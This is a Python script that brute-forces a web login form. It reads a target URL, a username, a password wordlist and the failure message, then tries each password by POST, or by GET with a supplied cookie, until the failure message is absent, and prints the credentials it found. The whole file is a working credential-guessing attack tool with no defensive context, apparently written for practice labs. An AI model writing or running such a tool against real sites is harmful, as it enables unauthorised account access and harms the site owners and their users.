import requests as req # to manipulate the get and post requests


url= input("[+] Enter the page URL: ") # input the webpage we want to input
username= input("[+] Enter the Username to Bruteforce: ")
pw_file=input("[+] Enter Password file: ")
error_str= input("[+] Enter Error Message: ")
cookie_val= input("[+] Enter Cookie value (Optional): ")


#Params to change depending on website
Login="submit" #need to modify depending on the type of the button to send the request

#functions
def bruteforcing(username,url):
    for pw in passwords:
        pw=pw.strip() # remove any empty column that could disturb us.
        print('Test Password: '+ str(pw))
        data={'username':username, "password":pw,'Login':Login}
        
        if cookie_val != "":
            data['Login']="Login"
            resp=req.get(url,params=data,cookies = {'Cookie': cookie_val}) 
        else:
            resp=req.post(url,data=data)

        if error_str in resp.content.decode():
            pass
        else:
            print("[+] Found Username ==> "+str(username))
            print("[+] Found Password ==> "+str(pw))
            exit(0)

            
#we read the pw file
with open(pw_file,'r') as passwords:
    bruteforcing(username,url)



